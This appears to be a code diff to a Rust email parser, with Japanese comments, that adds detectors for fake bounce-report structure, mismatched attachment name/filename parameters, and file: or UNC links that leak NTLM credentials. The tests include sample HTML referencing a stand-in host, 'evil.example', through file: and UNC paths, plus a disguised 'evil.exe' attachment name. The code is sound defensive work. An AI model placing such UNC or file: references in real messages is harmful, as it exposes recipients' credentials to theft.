@@ -96,6 +96,16 @@ pub struct Envelope {
     /// DKIM-Signature ヘッダーの生値 (`l=` タグ乱用・リプレイ検出に使用)。
     /// 複数署名がある場合は先頭のみ保持する。
     pub dkim_signature: Option<String>,
+    /// `multipart/report`・`message/delivery-status` 等の
+    /// 配送ステータス通知構造を持つか — 本物のバウンスと同じ形式で
+    /// 構造だけ手作りされた fake NDR (バックスキャッタ) の兆候 (D229)。
+    /// 正常なバウンスも一致するため危険判定ではなく兆候。
+    pub auto_report_structure: bool,
+    /// 添付パートの `Content-Type: name=` と `Content-Disposition: filename=`
+    /// が異なるファイル名を指すか — 表示器が片方、検査器がもう片方を
+    /// 採用すれば「見せている拡張子」と「実際の拡張子」を分けられる
+    /// parser differential 型偽装の兆候 (D230)。
+    pub attachment_name_mismatch: bool,
 }
 
 /// An RFC 5322 address.
@@ -330,6 +340,12 @@ pub fn parse(raw: &[u8]) -> Result<Envelope, RenderError> {
     // Authentication-Results ヘッダーをパース
     let auth_results = parse_auth_results(&msg);
 
+    let raw_text = String::from_utf8_lossy(raw);
+    // D229: multipart/report 等の配送ステータス通知構造。
+    let auto_report_structure = has_auto_report_structure(&raw_text);
+    // D230: name= と filename= の不一致 (parser differential)。
+    let attachment_name_mismatch = attachment_name_disagreement(&raw_text);
+
     Ok(Envelope {
         message_id,
         from,
@@ -347,7 +363,69 @@ pub fn parse(raw: &[u8]) -> Result<Envelope, RenderError> {
         in_reply_to,
         references,
         dkim_signature,
+        auto_report_structure,
+        attachment_name_mismatch,
     })
+}
+
+/// 配送ステータス通知構造 (`multipart/report`・`message/delivery-status` 等)
+/// を持つか判定する (D229)。
+///
+/// 本物のバウンスと同じ形式を構造だけ手作りすると、見た目は
+/// 「送信失敗通知」だが内容を攻撃者が完全に制御できる
+/// (NDR backscatter)。正常バウンスも一致するため兆候として扱う。
+fn has_auto_report_structure(raw: &str) -> bool {
+    let lower = raw.to_ascii_lowercase();
+    lower.contains("multipart/report")
+        || lower.contains("report-type=delivery-status")
+        || lower.contains("message/delivery-status")
+        || lower.contains("message/disposition-notification")
+}
+
+/// 添付パートの `name=` と `filename=` パラメータが不一致か判定する (D230)。
+///
+/// `Content-Type: name=` と `Content-Disposition: filename=` の両方を持ち
+/// 値が異なる場合、表示器が片方・検査器がもう片方を採用すれば
+/// 「見せている拡張子」と「実際の拡張子」を分けられる
+/// (parser differential)。値はクォート・トークン両方を比較。
+fn attachment_name_disagreement(raw: &str) -> bool {
+    let lower = raw.to_ascii_lowercase();
+    let mut pos = 0usize;
+    while let Some(rel) = lower[pos..].find("filename=") {
+        let fpos = pos + rel;
+        // filename= の値を抽出 (クォートまたは次の ;/空白/> まで)
+        let fval = header_param_value(&lower[fpos + 9..]);
+        // 前後 300 バイト内に name= を探して比較
+        // (filename= の語尾 "me=" に誤マッチしないよう直前の文字を検査)
+        let win_start = fpos.saturating_sub(300);
+        let win_end = (fpos + 300).min(lower.len());
+        let win = &lower[win_start..win_end];
+        let mut npos = 0usize;
+        while let Some(nrel) = win[npos..].find("name=") {
+            let abs = npos + nrel;
+            // "filename=" の語尾にあたる場合はスキップ
+            let is_filename_tail = abs >= 4 && &win[abs - 4..abs] == "file";
+            if !is_filename_tail {
+                let nval = header_param_value(&lower[win_start + abs + 5..]);
+                if !fval.is_empty() && !nval.is_empty() && fval != nval {
+                    return true;
+                }
+            }
+            npos = abs + 5;
+        }
+        pos = fpos + 9;
+    }
+    false
+}
+
+/// `name=`/`filename=` の値を抽出する — `;`・空白・`>`・CRLF で終端。
+/// 先頭のクォートは剥ぐ。
+fn header_param_value(s: &str) -> &str {
+    let s = s.trim_start_matches(|c| c == '"' || c == '\'');
+    let end = s
+        .find(|c: char| c == ';' || c == '>' || c.is_whitespace())
+        .unwrap_or(s.len());
+    &s[..end]
 }
 
 fn addr_to_address(addr: &mail_parser::Addr<'_>) -> Option<Address> {
@@ -683,6 +761,10 @@ pub struct ExtractedBodyText {
     /// アンカーテキストが URL 形で、そのドメインが実際のリンク先と
     /// 異なるリンク (URL 偽装 — 表示は正規サイト・実リンクは別ドメイン)。
     pub link_mismatches: Vec<LinkMismatch>,
+    /// `src=`/`href=` に `file:` スキームや `\\` UNC パスがあるか —
+    /// 参照解決時に NTLM 認証情報を外部へ漏す資格情報窃取経路の兆候
+    /// (NTLM relay 攻撃、D228)。
+    pub ntlm_leak_path: bool,
 }
 
 /// 表示テキストと実リンク先が一致しないリンク (D162)。
@@ -868,7 +950,32 @@ pub fn html_to_text(html: &str) -> ExtractedBodyText {
         // ごく短い隠し要素 (装飾・スペース等) では兆候を立てない。
         hidden_content: hidden_chars >= 32,
         link_mismatches,
+        ntlm_leak_path: has_ntlm_leak_path(html),
     }
+}
+
+/// `src=`/`href=` 内の `file:` スキームや `\\` UNC パスを検出する (D228)。
+///
+/// file: スキームまたは `\\server` 型 UNC パスの参照は、解決時に
+/// NTLM 認証情報を外部サーバへ送信する資格情報窃取経路になる
+/// (Outlook NTLM leak / relay 攻撃として観測)。
+fn has_ntlm_leak_path(html: &str) -> bool {
+    let lower = html.to_ascii_lowercase();
+    for pat in [
+        "src=\"file:",
+        "src='file:",
+        "href=\"file:",
+        "href='file:",
+        "src=\"\\\\",
+        "src='\\\\",
+        "href=\"\\\\",
+        "href='\\\\",
+    ] {
+        if lower.contains(pat) {
+            return true;
+        }
+    }
+    false
 }
 
 /// タグ名を読む (`<`/`</` の直後から。ASCII 英字で始まらなければ空)。
@@ -1950,6 +2057,57 @@ mod tests {
             result.addr.local, "\"ceo@trusted.com\"",
             "quoted local part は @ の前の部分全体であるべき"
         );
+    }
+
+    /// D228: file:/UNC 参照の NTLM 漏洩検出。
+    #[test]
+    fn parse_はntlm漏洩参照を検出する() {
+        assert!(has_ntlm_leak_path("<img src=\"file://evil.example/s\">"));
+        assert!(has_ntlm_leak_path(
+            "<a href='file:\\\\evil.example\\\\x'>a</a>"
+        ));
+        assert!(has_ntlm_leak_path("<img src=\"\\\\evil.example\\\\i\">"));
+        let e = html_to_text("<img src=\"file://evil.example/x\">t");
+        assert!(e.ntlm_leak_path);
+        assert!(!has_ntlm_leak_path("<img src=\"http://e/x\">"));
+        assert!(!has_ntlm_leak_path("<img src=\"cid:a\">"));
+    }
+
+    /// D229: 配送ステータス通知構造の検出。
+    #[test]
+    fn parse_は配送通知構造を検出する() {
+        assert!(has_auto_report_structure("Content-Type: multipart/report;"));
+        assert!(has_auto_report_structure("report-type=delivery-status"));
+        assert!(has_auto_report_structure(
+            "Content-Type: message/delivery-status"
+        ));
+        assert!(has_auto_report_structure(
+            "Content-Type: message/disposition-notification"
+        ));
+        assert!(!has_auto_report_structure("Content-Type: multipart/mixed;"));
+        assert!(!has_auto_report_structure("text/plain"));
+    }
+
+    /// D230: name= と filename= の不一致検出。
+    #[test]
+    fn parse_はname_filename不一致を検出する() {
+        assert!(attachment_name_disagreement(
+            "Content-Type: image/png; name=\"a.png\" \
+             Content-Disposition: attachment; filename=\"b.png\""
+        ));
+        assert!(attachment_name_disagreement(
+            "name=\"safe.png\"; filename=\"evil.exe\""
+        ));
+        // 一致は対象外
+        assert!(!attachment_name_disagreement(
+            "name=\"a.png\"; filename=\"a.png\""
+        ));
+        // name= のみ / filename= のみは対象外
+        assert!(!attachment_name_disagreement(
+            "filename=\"a.png\""
+        ));
+        assert!(!attachment_name_disagreement("name=\"a.png\""));
+        assert!(!attachment_name_disagreement(""));
     }
 
     #[test]
